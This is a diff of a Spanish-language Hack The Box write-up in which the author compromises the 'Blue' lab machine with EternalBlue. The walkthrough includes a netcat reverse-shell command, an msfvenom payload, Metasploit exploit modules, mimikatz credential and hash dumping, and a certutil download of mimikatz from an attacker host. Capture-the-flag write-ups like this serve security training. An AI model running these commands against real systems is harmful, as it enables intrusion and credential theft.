@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Blue - Hack The Box
-excerpt: "Una máquina relativamente fácil, ya que usamos un Exploit muy conocido que hace juego con el nombre de la máquina y que hay una historia algo curiosa, siendo que este Exploit supuestamente fue robado a la NCA."
+excerpt: "Una máquina relativamente fácil, ya que usamos un Exploit muy conocido que hace juego con el nombre de la máquina y que hay una historia detrás de su obtención, siendo que este Exploit supuestamente fue robado a la NCA. Haremos uso del famoso Exploit Eternal Blue para ganar acceso como un usuario administrador, aprovecharemos para utilizar otras herramientas para obtener información sobre el servicio SMB y la máquina."
 date: 2023-01-18
 classes: wide
 header:
@@ -15,16 +15,19 @@ tags:
   - Windows
   - SMB
   - Remote Code Execution (RCE)
-  - Eternal Blue - MS17-010
+  - Eternal Blue MS17-010 (RCE)
   - Reverse Shell
+  - Privesc - Eternal Blue MS17-010 (RCE)
   - Mimikatz
   - OSCP Style
   - Metasploit Framework
 ---
 ![](/assets/images/htb-writeup-blue/blue_logo.png)
-Una máquina relativamente fácil, ya que usamos un Exploit muy conocido que hace juego con el nombre de la máquina y que hay una historia algo curiosa, siendo que este Exploit "supuestamente" fue robado a la NCA. Haremos uso del famoso Exploit **Eternal Blue**, aprovecharemos para utilizar otras herramientas para obtener información sobre el **servicio SMB** y la máquina.
+
+Una máquina relativamente fácil, ya que usamos un Exploit muy conocido que hace juego con el nombre de la máquina y que hay una historia detrás de su obtención, siendo que este Exploit "supuestamente" fue robado a la NCA. Haremos uso del famoso Exploit **Eternal Blue** para ganar acceso como un **usuario administrador**, aprovecharemos para utilizar otras herramientas para obtener información sobre el **servicio SMB** y la máquina.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *smbclient*
 * *python2*
@@ -33,6 +36,8 @@ Herramientas utilizadas:
 * *msfvenom*
 * *nc*
 * *metasploit framework*
+* *Módulo: auxiliary/scanner/smb/smb_ms17_010)*
+* *Módulo: exploit/windows/smb/ms17_010_eternalblue*
 * *mimikatz.exe*
 * *certutil.exe*
 
@@ -62,7 +67,7 @@ Herramientas utilizadas:
                         </ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#mimik">Dumpeando Hashes con Modulo Kiwi en Metasploit Framework</a></li>
+				<li><a href="#mimik">Dumpeando Hashes con Módulo Kiwi en Metasploit Framework</a></li>
 				<li><a href="#mimik2">Usando Mimikatz en Máquina Víctima</a></li>
 				<li><a href="#mimik3">Cargando Mimikatz desde Nuestra Máquina</a></li>
 			</ul>
@@ -75,10 +80,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -205,10 +207,7 @@ Aquí vemos que se usa el **servicio SMB** bastante, podemos ver información ex
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -236,7 +235,7 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 3.95 seconds
 ```
-Este script muestra el protocolo de red que usa el **servicio SMB**, existen varios como el SMBv1, SMBv2, SMBv2.1, SMBv3 y SMBv3.X. El SMBv1 es el más vulnerable y es el que nos será útil más adelante.
+Este script muestra el protocolo de red que usa el **servicio SMB**, existen varios como el **SMBv1, SMBv2, SMBv2.1, SMBv3 y SMBv3.X**. El **SMBv1** es el más vulnerable y es el que nos será útil más adelante.
 
 * **Script de reconocimiento de seguridad de SMB**:
 
@@ -329,7 +328,7 @@ locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
 "vuln"
 ```
 
-Vemos varias, las que nos pueden interesar en este momento son la de **vuln, discovery, intrusive, auth y brute**, pero vamos a usar la de **vuln** unicamente, para que podamos encontrar a que es vulnerable el SMB y usaremos la categoria **safe**, para que sea de forma segura y no hagamos tanto ruido en el sistema a escanear:
+Vemos varias, las que nos pueden interesar en este momento son la de **vuln, discovery, intrusive, auth y brute**, pero vamos a usar la de **vuln** unicamente, para que podamos encontrar a que es vulnerable el **SMB** y usaremos la categoria **safe**, para que sea de forma segura y no hagamos tanto ruido en el sistema a escanear:
 ```bash
 nmap --script "vuln and safe" -p445 10.10.10.40 -oN smbVulnScan
 Nmap 7.93 scan initiated Jan 19 12:42:40 2023 as: nmap --script "vuln and safe" -p445 -oN smbVulnScan 10.10.10.40
@@ -378,6 +377,7 @@ Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
 ```
+
 Bien, podemos ver 5 recursos, veamos si podemos loguearnos a alguno de estos:
 ```bash
 smbclient //10.10.10.40/ADMIN
@@ -437,10 +437,7 @@ Como contraseña, estoy usando cualquiera, pero como podras ver, no tenemos acce
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -471,9 +468,10 @@ En este punto, vamos a utilizar tres versiones de este Exploit, usaremos una ver
 
 <h2 id="exploit1">Probando Exploit EternalBlue de GitHub</h2>
 
-Vamos a descargar el siguiente repositorio:
-* https://github.com/worawit/MS17-010
+Vamos a clonar el siguiente repositorio:
+* <a href="https://github.com/worawit/MS17-010" target="_blank">Repositorio de Worawit: MS17-010</a>
 
+Clonalo:
 ```bash
 git clone https://github.com/worawit/MS17-010.git
 Clonando en 'MS17-010'...
@@ -524,15 +522,16 @@ USERNAME = 'guest'
 ANTES: service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
 DESPUES: service_exec(conn, r'cmd /c C:\Tu_IP\smbFolder\nc.exe -e cmd Tu_IP 443')
 ```
+
 * Buscando y descargando **netcat**:
 ```bash
 locate nc.exe
 .
 cp cp /usr/share/windows-resources/binaries/nc.exe .
 ```
-**NOTA**: La **netcat** debe ser para arquitectura de 64 bits, pues esta es la arquitectura que maneja la máquina. Por lo que se, Kali ya cuenta con uno en sus binarios de windows, pero puede descargar una desde internet por si las dudas: https://eternallybored.org/misc/netcat/
+**NOTA**: La **netcat** debe ser para arquitectura de **64 bits**, pues esta es la arquitectura que maneja la máquina. Por lo que se, Kali ya cuenta con uno en sus binarios de windows, pero puedes descargar una desde internet por si las dudas: <a href="https://eternallybored.org/misc/netcat/" target="_blank">Netcat 32bits y 64bits</a>
 
-* Abriendo un archivo compartido a nivel de red de nuestro directorio actual de trabajo (osease, donde tengamos la nc.exe) con **Impacket** y le damos soporte de SMBv2 por si las dudas:
+* Abriendo un archivo compartido a nivel de red de nuestro directorio actual de trabajo (osease, donde tengamos la **nc.exe**) con **Impacket** y le damos soporte de **SMBv2** por si las dudas:
 ```bash
 impacket-smbserver smbFolder $(pwd) -smb2support
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -592,9 +591,9 @@ File Type: Python script, ASCII text executable
 Como tal, no viene información sobre como usarlo, menciona que debemos usar otro script llamado **mysmb.py**, quiza si buscamos en internet, podamos encontrar algo útil.
 
 Y justo nos sale un GitHub con el Exploit que vamos a usar:
-* https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit
+* <a href="https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit" target="_blank">Repositorio de AnikateSawhney: Pwning_Blue_From_HTB_Without_Metasploit</a>
 
-Leyéndolo un poco, menciona que este Exploit necesita usar un entorno virtual en python 2, aunque realmente no es necesario si es que tienes instalado **Python2** en tu entorno, así que solamente evitaremos ese paso.
+Leyéndolo un poco, menciona que este Exploit necesita usar un entorno virtual en **Python2**, aunque realmente no es necesario si es que tienes instalado **Python2** en tu entorno, así que solamente evitaremos ese paso.
 
 Vamos a configurar el Exploit por pasos.
 
@@ -602,14 +601,17 @@ Vamos a configurar el Exploit por pasos.
 ```bash
 mv 42315.py Eternal_Blue.py
 ```
+
 * Descargando **mysmb.py**:
 ```bash
 wget https://raw.githubusercontent.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit/main/mysmb.py
 ```
+
 * Creando **Reverse Shell** con **Msfvenom**:
 ```bash
 msfvenom -p windows/shell_reverse_tcp -f exe LHOST=Tu_IP LPORT=443 > eternal-blue.exe
 ```
+
 * Modificando el Exploit con algunos datos:
 ```bash
 USERNAME = 'guest'
@@ -621,10 +623,11 @@ DESPUES: service_exec(conn, r'cmd /c c:\eternal-blue.exe')
 ```
 
 Una vez ya listo, vamos a activar una **netcat** que es ahí donde se conectara el script y luego lo activamos:
-```
+```bash
 nc -nvlp 443
 listening on [any] 443 ...
 ```
+
 * Activando script:
 ```bash
 python2 Exploit_Blue.py 10.10.10.40
@@ -636,7 +639,8 @@ GROOM_POOL_SIZE: 0x5030
 ...
 Done
 ```
-* Resultado en **Netcat**:
+
+* Resultado en **netcat**:
 ```
 nc -nvlp 443
 listening on [any] 443 ...
@@ -667,10 +671,12 @@ Matching Modules
    3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
    4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
 ```
+
 Vamos a ocupar el escaner para saber si es vulnerable al eternal blue y luego usaremos el Exploit:
 ```bash
 use auxiliary/scanner/smb/smb_ms17_010
 ```
+
 Y veamos que necesita este modulo para funcionar correctamente:
 ```bash
 show options
@@ -690,12 +696,14 @@ Module options (auxiliary/scanner/smb/smb_ms17_010):
    SMBUser                                                                      no        The username to authenticate as
    THREADS      1                                                               yes       The number of concurrent threads (max one per host)
 ```
+
 Necesitamos unicamente meter la IP de la máquina víctima y como conocemos el usuario, vamos a meterlo también:
 ```bash
 set RHOSTS 10.10.10.40
 .
 set SMBUser guest
 ```
+
 Y lo ejecutamos:
 ```bash
 exploit
@@ -709,6 +717,7 @@ Excelente, nos menciona que si es probablemente vulnerable, entonces usemos el m
 ```bash
 use exploit/windows/smb/ms17_010_eternalblue
 ```
+
 Veamos las opciones:
 ```bash
 show options
@@ -741,6 +750,7 @@ Exploit target:
    --  ----
    0   Automatic Target
 ```
+
 Igual, necesitamos la IP de la máquina víctima, el usuario y recuerda verificar tu IP:
 ```bash
 set RHOSTS 10.10.10.40
@@ -798,19 +808,16 @@ Listo, hemos obtenido acceso a la máquina de 3 formas distintas, es momento de 
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
 
 En esta parte, vamos a recolectar información útil del sistema tanto en el **Metasploit Framework** como de forma libre.
 
-<h2 id="mimik">Dumpeando Hashes con Modulo Kiwi en Metasploit Framework</h2>
+<h2 id="mimik">Dumpeando Hashes con Módulo Kiwi en Metasploit Framework</h2>
 
-Para usarlo, debemos cargar el modulo Kiwi:
+Para usarlo, debemos cargar el **módulo Kiwi**:
 ```bash
 meterpreter > load kiwi
 Loading extension kiwi...
@@ -824,7 +831,7 @@ Loading extension kiwi...
 Success.
 ```
 
-El **modulo Kiwi**, nos permite varias cosillas pues trabaja con **mimikatz**, pero lo más importante es que nos ayuda a obtener las **credenciales de los usuarios registrados, los hashes de SAM y los LSA_SECRETS**.
+El **módulo Kiwi**, nos permite varias cosillas pues trabaja con **mimikatz**, pero lo más importante es que nos ayuda a obtener las **credenciales de los usuarios registrados, los hashes de SAM y los LSA_SECRETS**.
 
 * **Dumpeando Credenciales**:
 
@@ -857,7 +864,7 @@ Username       Domain     Password
 Administrator  haris-PC   (null)
 haris-pc$      WORKGROUP  (null)
 ```
-De esta forma, obtuvimos las credenciales del usuario administrador, incluso la obtuvimos en texto claro.
+De esta forma, obtuvimos las credenciales del **usuario administrador**, incluso la obtuvimos en texto claro.
 
 * **Dumpeando los Hashes de SAM**:
 
@@ -882,7 +889,7 @@ RID  : 000003e8 (1000)
 User : haris
   Hash NTLM: 8002bc89de91f6b52d518bde69202dc6
 ```
-Obtenemos el hash del administrador y del usuario harris.
+Obtenemos el hash del **administrador** y del **usuario harris**.
 
 * **Dumpeando los LSA SECRETS**:
 
@@ -912,11 +919,11 @@ old/hex : 01 00 00 00 c9 22 d6 0b 83 9e dd 98 a7 ad 7a 5a c5 ff 4e bb 8a d2 6f 0
     m/u : c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f01 / 61bebfd4bc705470fddf4612a8c5e52d986c7971
 ```
 
-Con esto, terminamos de usar el **modulo Kiwi**, ahora podemos cargar el programa **mimikatz.exe** para poder obtener lo mismo que hizo Kiwi.
+Con esto, terminamos de usar el **módulo Kiwi**, ahora podemos cargar el programa **mimikatz.exe** para poder obtener lo mismo que hizo **Kiwi**.
 
 <h2 id="mimik2">Usando Mimikatz en Máquina Víctima</h2>
 
-Para que el **mimikatz.exe** funcione, debe ser ejecutado como un administrados, para identificarnos como administrador desde el **Metasploit Framework**, necesitamos migrar a un proceso que es ejecutado unicamente como administrador, el más común de estos procesos es el **lsass.exe**. Para migrar a este proceso, necesitamos su **PID** y que tengamos permisos suficientes para esta migración, hagamos esto por pasos:
+Para que el **mimikatz.exe** funcione debe ser ejecutado como un **administrador**, para identificarnos como **administrador** desde el **Metasploit Framework**, necesitamos migrar a un proceso que es ejecutado unicamente como **administrador**, el más común de estos procesos es el **lsass.exe**. Para migrar a este proceso, necesitamos su **PID** y que tengamos permisos suficientes para esta migración, hagamos esto por pasos:
 
 * Viendo procesos:
 ```bash
@@ -998,6 +1005,7 @@ Mode              Size     Type  Last modified              Name
 100777/rwxrwxrwx  1355264  fil   2024-03-11 22:45:55 -0600  mimikatz.exe
 000000/---------  0        fif   1969-12-31 18:00:00 -0600  pagefile.sys
 ```
+
 Y nos metemos con una shell a la máquina:
 ```bash
 meterpreter > shell
@@ -1010,7 +1018,7 @@ C:\>
 ```
 
 Ahora, ejecutamos el programa **mimikatz.exe**:
-```bash
+```batch
 C:\>.\mimikatz.exe
 .\mimikatz.exe
 
@@ -1025,13 +1033,13 @@ mimikatz #
 ```
 
 Revisamos que tengamos los privilegios necesarios para dumpear los hashes:
-```bash
+```batch
 mimikatz # privilege::debug
 Privilege '20' OK
 ```
 
 Y obtenemos las credenciales:
-```bash
+```batch
 mimikatz # sekurlsa::logonpasswords
 
 Authentication Id : 0 ; 542841 (00000000:00084879)
@@ -1067,7 +1075,7 @@ Authentication Id : 0 ; 997 (00000000:000003e5)
 ```
 
 También obtenemos los hashes del **SAM**:
-```bash
+```batch
 mimikatz # lsadump::sam
 Domain : HARIS-PC
 SysKey : a749692f1dc76b46d7141ef778aa6bef
@@ -1091,13 +1099,13 @@ User : haris
 
 Por último, vamos a cargar **mimikatz** desde nuestra máquina, utilizando **certutil.exe**
 
-Primero, vamos a abrir un servidor en python:
+Primero, vamos a abrir un servidor en **Python**:
 ```bash
 python3 -m http.server 80
 ```
 
-Ahora con certutil.exe, descargamos **mimikatz** en la máquina víctima:
-```bash
+Ahora con **certutil.exe**, descargamos **mimikatz** en la máquina víctima:
+```batch
 C:\>certutil.exe -f -urlcache -split http://Tu_IP/mimikatz.exe
 certutil.exe -f -urlcache -split http://Tu_IP/mimikatz.exe
 ****  Online  ****
@@ -1107,7 +1115,7 @@ CertUtil: -URLCache command completed successfully.
 ```
 
 Revisamos que se haya descargado correctamente:
-```bash
+```batch
 C:\>dir
 dir
  Volume in drive C has no label.
@@ -1129,10 +1137,7 @@ Ahora que tienes las credenciales y hashes, puedes probar a conectarte a la máq
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
 
 
@@ -1140,9 +1145,53 @@ Ahora que tienes las credenciales y hashes, puedes probar a conectarte a la máq
 * https://www.avast.com/es-es/c-eternalblue
 * https://www.exploit-db.com/exploits/42315
 * https://github.com/worawit/MS17-010
-* https://www.youtube.com/watch?v=92XycxcAXkI
 * https://www.elladodelmal.com/2018/01/named-pipe-impersonation-escalando.html
 * https://resources.infosecinstitute.com/topics/penetration-testing/mimikatz-walkthrough/
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
